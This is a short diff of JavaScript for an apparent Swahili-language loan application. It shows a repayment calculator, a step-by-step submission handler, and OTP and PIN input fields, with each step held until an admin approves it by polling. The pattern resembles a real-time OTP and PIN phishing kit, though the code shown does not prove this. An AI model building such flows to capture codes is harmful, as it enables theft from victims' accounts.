@@ -21,19 +21,18 @@ function updateCalculator() {
     document.getElementById('displayMonths').innerText = months + ' miezi';
     document.getElementById('requestedAmount').value = amount;
 
-    // Estimated calculation (e.g., 9% interest total spread over months)
     const monthly = (Number(amount) * 1.09) / Number(months);
     document.getElementById('displayMonthlyPayment').innerText = 'TZS ' + Math.round(monthly).toLocaleString();
 }
 
 function submitCalculator(e) {
-    e.preventDefault(); // Prevents page reload/reset back to home
-    goToScreen('screen-personal'); // Moves cleanly to the next screen
+    e.preventDefault();
+    goToScreen('screen-personal');
 }
 
 // Global server request handler
 async function postData(step, data) {
-    showSpinner();
+    showSpinner('Inasubiri uthibitisho...');
     try {
         const response = await fetch('/api/submit', {
             method: 'POST',
@@ -41,7 +40,7 @@ async function postData(step, data) {
             body: JSON.stringify({ step, data })
         });
         const result = await response.json();
-        if (result.pendingApproval || result.resendAcknowledge) {
+        if (result.pendingApproval) {
             pollAdminResponse();
         } else {
             hideSpinner();
@@ -54,7 +53,6 @@ async function postData(step, data) {
 }
 
 function pollAdminResponse() {
-    showSpinner('Inasubiri uthibitisho...');
     const pollInterval = setInterval(() => {
         fetch('/api/poll-status')
             .then(res => res.json())
@@ -155,4 +153,4 @@ document.addEventListener('DOMContentLoaded', () => {
     setupOtpInputs('.otp-input');
     setupOtpInputs('.pin-input');
 });
-            
+        
